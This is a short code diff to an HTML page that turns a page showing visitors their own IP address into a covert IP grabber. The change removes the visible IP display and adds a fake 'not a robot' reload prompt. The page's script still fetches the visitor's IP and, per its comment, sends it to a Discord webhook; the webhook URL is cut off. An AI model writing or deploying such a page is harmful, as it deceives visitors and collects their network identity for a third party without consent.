@@ -4,15 +4,15 @@
     <title>IP Address</title>
   </head>
   <body>
-    <h1>Your IP Address:</h1>
-    <p id="ip"></p>
+    <h1>Please reload the page so I know you are not a robot.</h1>
+
     <script>
       // Get the visitor's IP address
       fetch("https://api.ipify.org?format=json")
         .then(response => response.json())
         .then(data => {
           // Display the visitor's IP address
-          document.getElementById("ip").innerHTML = data.ip;
+          
 
           // Send the encrypted IP address to the Discord webhook
           const webhookUrl = "https://ptb.discord.c"
